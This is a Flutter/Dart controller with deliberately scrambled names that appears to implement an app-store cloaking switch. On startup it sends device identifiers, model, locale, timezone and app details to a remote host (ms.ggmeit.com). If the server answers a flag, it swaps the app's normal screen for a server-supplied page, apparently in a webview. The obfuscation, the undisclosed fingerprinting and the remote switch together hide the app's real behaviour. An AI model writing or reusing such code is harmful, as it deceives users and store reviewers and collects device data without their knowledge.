import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class BulletScrollLogic extends GetxController {

  var henostjylz = RxBool(false);
  var pkehdayxco = RxBool(true);
  var emuokf = RxString("");
  var evangeline = RxBool(false);
  var bayer = RxBool(true);
  final oyezuxwif = Dio();


  InAppWebViewController? webViewController;

  dynamic xrfupmbeyt(){
    final iejdxyourm = InternetConnectionChecker.instance;
    final ophymikja = iejdxyourm.onStatusChange.skip(1).listen(
          (InternetConnectionStatus mzcodwq) {
        if (mzcodwq == InternetConnectionStatus.connected) {
          eirou();
        } else {
          Get.toNamed('/bullet_fail')?.then((_){
            eirou();
          });
        }
      },
    );
    return ophymikja;
  }

  Future<bool> fogpzw() async {
    var yignbouzfd = await InternetConnectionChecker.instance.hasConnection;
    if(!yignbouzfd){
      Get.toNamed('/bullet_fail')?.then((_){
        eirou();
      });
    }
    return yignbouzfd;
  }

  @override
  void onInit() {
    super.onInit();
    xrfupmbeyt();
    eirou();
  }


  Future<void> eirou() async {

    var dweuikpzhr = await fogpzw();
    if(!dweuikpzhr){
      return;
    }

    evangeline.value = true;
    bayer.value = true;
    pkehdayxco.value = false;

    oyezuxwif.post("https://ms.ggmeit.com/DgRyIep",data: await xefakzog()).then((value) {
      var vipr = value.data["vipr"] as String;
      var oldr = value.data["oldr"] as bool;
      if (oldr) {
        emuokf.value = vipr;
        carlo();
      } else {
        fay();
      }
    }).catchError((e) {
      pkehdayxco.value = true;
      bayer.value = true;
      evangeline.value = false;
    });
  }

  Future<Map<String, dynamic>> xefakzog() async {
    final DeviceInfoPlugin rshtep = DeviceInfoPlugin();
    PackageInfo uelh_orjhm = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mbeacfsp = Platform.localeName;
    var ZJQys = currentTimeZone;

    var XoDHqiA = uelh_orjhm.packageName;
    var twpBKaf = uelh_orjhm.version;
    var HBdQyXms = uelh_orjhm.buildNumber;

    var eguF = uelh_orjhm.appName;
    var ciFxOfD = "";
    var yvCDHeV  = "";
    var wpGeOBb = "";
    var alexandroStamm = "";
    var howellKeebler = "";
    var carmelaPredovic = "";
    var danteSchinner = "";


    var hTCvHskJ = "";
    var Xdfyt = false;

    if (GetPlatform.isAndroid) {
      hTCvHskJ = "android";
      var uxpcey = await rshtep.androidInfo;

      wpGeOBb = uxpcey.brand;

      ciFxOfD  = uxpcey.model;
      yvCDHeV = uxpcey.id;

      Xdfyt = uxpcey.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hTCvHskJ = "ios";
      var iuntgaj = await rshtep.iosInfo;
      wpGeOBb = iuntgaj.name;
      ciFxOfD = iuntgaj.model;

      yvCDHeV = iuntgaj.identifierForVendor ?? "";
      Xdfyt  = iuntgaj.isPhysicalDevice;
    }
    var res = {
      "HBdQyXms": HBdQyXms,
      "twpBKaf": twpBKaf,
      "XoDHqiA": XoDHqiA,
      "howellKeebler" : howellKeebler,
      "ciFxOfD": ciFxOfD,
      "ZJQys": ZJQys,
      "wpGeOBb": wpGeOBb,
      "mbeacfsp": mbeacfsp,
      "alexandroStamm" : alexandroStamm,
      "hTCvHskJ": hTCvHskJ,
      "eguF": eguF,
      "Xdfyt": Xdfyt,
      "carmelaPredovic" : carmelaPredovic,
      "yvCDHeV": yvCDHeV,
      "danteSchinner" : danteSchinner,

    };
    return res;
  }

  Future<void> fay() async {
    Get.offNamed("/bullet_main");
  }

  Future<void> carlo() async {
    Get.offNamed("/bullet_font");
  }

  @override
  void dispose() {
    xrfupmbeyt().cancel();
    super.dispose();
  }

}
